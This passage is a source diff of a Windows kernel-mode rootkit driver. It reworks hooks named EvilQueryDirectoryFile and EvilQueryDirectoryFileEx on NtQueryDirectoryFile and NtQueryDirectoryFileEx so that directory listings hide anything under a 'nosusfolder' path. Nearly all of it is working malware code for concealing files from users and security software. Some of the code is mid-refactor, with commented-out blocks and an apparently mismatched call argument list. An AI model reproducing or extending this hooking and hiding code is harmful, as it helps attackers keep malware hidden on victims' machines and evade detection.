 	if (OriginalQueryDirFile == NULL) {
 		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
@@ -234,14 +589,24 @@ NTSTATUS roothook::EvilQueryDirectoryFile(IN HANDLE FileHandle,
 	// Call original NtQueryDirectoryFile and re-hook it:
 	OgNtQueryDirectoryFile = (QueryDirFile)OriginalQueryDirFile;
 	Status = OgNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
-								FileInformationLength, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
+		Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
 	if (!NT_SUCCESS(roothook::SystemFunctionHook(&roothook::EvilQueryDirectoryFile, NULL, "NtQueryDirectoryFile", FALSE, 'HkQr'))) {
 		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
 		DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFile failed (cannot rehook NtQueryDirectoryFile)\n");
 		DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
 		return STATUS_UNSUCCESSFUL;
 	}
-	if (!NT_SUCCESS(Status)){
+	*/
+
+
+	/*
+	// Call original NtQueryDirectoryFile:
+	OgNtQueryDirectoryFile = (QueryDirFile)OriginalNtQueryDirFile;
+	Status = OgNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
+		Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
+	*/
+
+	if (!NT_SUCCESS(Status) || FileInformation == NULL) {
 		//DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
 		//DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFile: actual NtQueryDirectoryFile failed with 0x%x\n", Status);
 		//DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
@@ -249,71 +614,34 @@ NTSTATUS roothook::EvilQueryDirectoryFile(IN HANDLE FileHandle,
 	}
 
 
-	// Make sure that if its a specific search (FileName != NULL), its still ignored:
-	if (FileName != NULL && FileName->Buffer != NULL) {
-		if (NT_SUCCESS(general::CopyStringAfterCharADD(FileName, &ActualFileName, '\\'))) {
-			DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFile, FileName exists: %wZ, shortened: %wZ\n", FileName, ActualFileName);
-			for (int SearchFileObj = 0; SearchFileObj < sizeof(DefaultFileObjs) / sizeof(const WCHAR*); SearchFileObj++) {
-				RtlInitUnicodeString(&CurrFileName, DefaultFileObjs[SearchFileObj]);
-				if (general::CompareUnicodeStringsADD(&CurrFileName, &ActualFileName, 0)) {
-					FileInformation = NULL;
-					IoStatusBlock->Information = NULL;
-					IoStatusBlock->Status = STATUS_NO_SUCH_FILE;
-					if (ActualFileName.Buffer != NULL) {
-						ExFreePool(ActualFileName.Buffer);
-					}
-					DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFile, hiding file/directory %wZ\n", FileName);
-					return STATUS_NO_SUCH_FILE;
-				}
-			}
-			if (ActualFileName.Buffer != NULL) {
-				ExFreePool(ActualFileName.Buffer);
-			}
-		}
+
+	// Allocate buffer for handle path (format - "\nosusfolder\verysus\...\actualsearchdir) and get the handle path:
+	HandleInfo = ExAllocatePoolWithTag(NonPagedPool, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), 'KfHi');
+	if (HandleInfo == NULL) {
+		return STATUS_UNSUCCESSFUL;
 	}
+	RtlZeroMemory(HandleInfo, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1));  // Make sure no leftovers of path are in pool
+	Status = ZwQueryInformationFile(FileHandle, &DirStatus, HandleInfo, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), FileNameInformation);
+	if (!NT_SUCCESS(Status)) {
+		ExFreePool(HandleInfo);
+		return STATUS_UNSUCCESSFUL;
+	}
+	RtlInitUnicodeString(&RequestedDir, ((PFILE_NAME_INFORMATION)HandleInfo)->FileName);
+	ExFreePool(HandleInfo);
 
 
-	if (FileInformationClass == FileIdBothDirectoryInformation || FileInformationClass == FileBothDirectoryInformation) {
-		// Check if queried directory is on the path/s / partly on the path/s that i want to hide by default:
-		DirectoryInfo = ExAllocatePoolWithTag(NonPagedPool, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), 'RkFr');
-		if (DirectoryInfo == NULL) {
-			return STATUS_SUCCESS;
-		}
-		Status = ZwQueryInformationFile(FileHandle, &DirStatus, DirectoryInfo, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), FileNameInformation);
-		if (!NT_SUCCESS(Status)) {
-			ExFreePool(DirectoryInfo);
-			return STATUS_SUCCESS;
-		}
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
-		RtlInitUnicodeString(&RequestedDir, ((PFILE_NAME_INFORMATION)DirectoryInfo)->FileName);
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
-		if (NT_SUCCESS(general::CopyStringAfterCharADD(&RequestedDir, &ActualDirName, '\\'))) {
-			DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFile: %wZ, shortened: %wZ\n", RequestedDir, ActualDirName);
-			for (int SearchDir = 0; SearchDir < sizeof(DefaultFileObjs) / sizeof(const WCHAR*); SearchDir++) {
-				RtlInitUnicodeString(&CurrDirName, DefaultFileObjs[SearchDir]);
-				if (general::CompareUnicodeStringsADD(&CurrDirName, &ActualDirName, 0)) {
-					FileInformation = NULL;
-					IoStatusBlock->Information = NULL;
-					IoStatusBlock->Status = STATUS_NO_SUCH_FILE;
-					if (ActualDirName.Buffer != NULL) {
-						ExFreePool(ActualDirName.Buffer);
-					}
-					ExFreePool(DirectoryInfo);
-					DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
-					return STATUS_NO_SUCH_FILE;
-				}
-			}
-			if (ActualDirName.Buffer != NULL) {
-				ExFreePool(ActualDirName.Buffer);
-			}
-		}
-		else {
-			DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFile: %wZ\n", RequestedDir);
-		}
-		ExFreePool(DirectoryInfo);
-		DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
+	// Search if path starts with "nosusfolder":
+	SearchForInitialEvilDir(&RequestedDir, &IsSystemRoot, &IsDirSame, 2);
+
+
+	// Filter results by type of information requested (both/bothid = fileexp,full/fullid=dir,cd):
+
+	Status = IterateOverFiles(FileInformationClass, FileInformation, &DirStatus, &IsDirSame, &RequestedDir, &IsSystemRoot,
+		&SusFolder, &QueryUnicode);
+	if (Status == STATUS_INVALID_PARAMETER) {
+		return STATUS_SUCCESS;  // type of information that is not traced, return success (nothing to change)
 	}
-	return STATUS_SUCCESS;
+	return Status;
 }
 
 
@@ -327,19 +655,29 @@ NTSTATUS roothook::EvilQueryDirectoryFileEx(IN HANDLE FileHandle,
 	FILE_INFORMATION_CLASS FileInformationClass,
 	IN ULONG QueryFlags,
 	IN PUNICODE_STRING FileName OPTIONAL) {
-	UNICODE_STRING QueryUnicode = { 0 };
-	UNICODE_STRING ObjectName = { 0 };
-	UNICODE_STRING CurrSearchName = { 0 };
-	UNICODE_STRING CurrSearchObj = { 0 };
-	PFILE_NAME_INFORMATION ObjectInfo = NULL;
-	IO_STATUS_BLOCK ObjectStatus = { 0 };
-	PVOID OriginalQueryDirFileEx = NULL;
+	UNICODE_STRING RequestedDir = { 0 };
+	UNICODE_STRING CurrentFile = { 0 };
+	UNICODE_STRING SusFolder = { 0 };
+	UNICODE_STRING QueryExUnicode = { 0 };
+	RtlInitUnicodeString(&SusFolder, L"nosusfolder");
+	RtlInitUnicodeString(&QueryExUnicode, L"NtQueryDirectoryFileEx");
+
+	IO_STATUS_BLOCK DirStatus = { 0 };
 	QueryDirFileEx OgNtQueryDirectoryFileEx = NULL;
 	NTSTATUS Status = STATUS_UNSUCCESSFUL;
+	BOOL IsDirSame = TRUE;
+	BOOL IsSystemRoot = TRUE;
+	PVOID HandleInfo = NULL;
+	PVOID OriginalQueryDirFileEx = NULL;
+	UNICODE_STRING QueryUnicode = { 0 };
 
 
+	OgNtQueryDirectoryFileEx = (QueryDirFileEx)ActualNtQueryDirFileEx;
+	Status = OgNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
+		Length, FileInformationClass, FileName);
+
+	/*
 	// Find NtQueryDirectoryFile base:
-	RtlInitUnicodeString(&QueryUnicode, L"NtQueryDirectoryFileEx");
 	OriginalQueryDirFileEx = MmGetSystemRoutineAddress(&QueryUnicode);
 	if (OriginalQueryDirFileEx == NULL) {
 		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
@@ -368,57 +706,48 @@ NTSTATUS roothook::EvilQueryDirectoryFileEx(IN HANDLE FileHandle,
 		DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
 		return STATUS_UNSUCCESSFUL;
 	}
-	if (!NT_SUCCESS(Status)) {
+	*/
+
+
+	/*
+	// Call original NtQueryDirectoryFileEx:
+	OgNtQueryDirectoryFileEx = (QueryDirFileEx)OriginalNtQueryDirFileEx;
+	Status = OgNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
+		Length, FileInformationClass, QueryFlags, FileName);
+		*/
+
+
+	if (!NT_SUCCESS(Status) || FileInformation == NULL) {
 		//DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
 		//DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFileEx: actual NtQueryDirectoryFileEx failed with 0x%x\n", Status);
 		//DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
 		return Status;
 	}
 
-
-	// Check if queried directory is on the path/s / partly on the path/s that i want to hide by default:
-	ObjectInfo = (PFILE_NAME_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), 'RkFx');
-	if (ObjectInfo == NULL) {
-		return STATUS_SUCCESS;
+	// Allocate buffer for handle path (format - "\nosusfolder\verysus\...\actualsearchdir) and get the handle path:
+	HandleInfo = ExAllocatePoolWithTag(NonPagedPool, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), 'KfHi');
+	if (HandleInfo == NULL) {
+		return STATUS_UNSUCCESSFUL;
 	}
-	Status = ZwQueryInformationFile(FileHandle, &ObjectStatus, &ObjectInfo, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), FileNameInformation);
+	RtlZeroMemory(HandleInfo, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1));  // Make sure no leftovers of path are in pool
+	Status = ZwQueryInformationFile(FileHandle, &DirStatus, HandleInfo, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), FileNameInformation);
 	if (!NT_SUCCESS(Status)) {
-		ExFreePool(ObjectInfo);
-		return STATUS_SUCCESS;
+		ExFreePool(HandleInfo);
+		return STATUS_UNSUCCESSFUL;
 	}
-	RtlInitUnicodeString(&ObjectName, ObjectInfo->FileName);
-	for (int SearchDir = 0; SearchDir < sizeof(DefaultFileObjs) / sizeof(const WCHAR*); SearchDir++) {
-		RtlInitUnicodeString(&CurrSearchName, DefaultFileObjs[SearchDir]);
-		if (general::IsExistFromIndexADD(&CurrSearchName, &ObjectName, 0)) {
-			FileInformation = NULL;
-			IoStatusBlock->Information = NULL;
-			IoStatusBlock->Status = STATUS_NO_SUCH_FILE;
-			ExFreePool(ObjectInfo);
-			RtlFreeUnicodeString(&CurrSearchName);
-			return STATUS_NO_SUCH_FILE;
-		}
-		RtlFreeUnicodeString(&CurrSearchName);
-	}
+	RtlInitUnicodeString(&RequestedDir, ((PFILE_NAME_INFORMATION)HandleInfo)->FileName);
+	ExFreePool(HandleInfo);
 
 
-	// Make sure that if its a specific search (FileName != NULL), its still ignored:
-	if (FileName != NULL) {
-		for (int SearchFileObj = 0; SearchFileObj < sizeof(DefaultFileObjs) / sizeof(const WCHAR*); SearchFileObj++) {
-			RtlInitUnicodeString(&CurrSearchObj, DefaultFileObjs[SearchFileObj]);
-			if (general::CompareUnicodeStringsADD(&CurrSearchObj, FileName, 0)) {
-				FileInformation = NULL;
-				IoStatusBlock->Information = NULL;
-				IoStatusBlock->Status = STATUS_NO_SUCH_FILE;
-				ExFreePool(ObjectInfo);
-				RtlFreeUnicodeString(&CurrSearchObj);
-				return STATUS_NO_SUCH_FILE;
-			}
-			RtlFreeUnicodeString(&CurrSearchObj);
-		}
+	// Search if path starts with "nosusfolder":
+	SearchForInitialEvilDir(&RequestedDir, &IsSystemRoot, &IsDirSame, 2);
+
+
+	// Filter results by type of information requested (both/bothid = fileexp,full/fullid=dir,cd):
+	Status = IterateOverFiles(FileInformationClass, FileInformation, &DirStatus, &IsDirSame, &RequestedDir, &IsSystemRoot,
+		&SusFolder, &QueryExUnicode);
+	if (Status == STATUS_INVALID_PARAMETER) {
+		return STATUS_SUCCESS;  // type of information that is not traced, return success (nothing to change)
 	}
-	DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
-	DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFileEx: %wZ\n", ObjectName);
-	DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
-	ExFreePool(ObjectInfo);
-	return STATUS_SUCCESS;
+	return Status;
 }
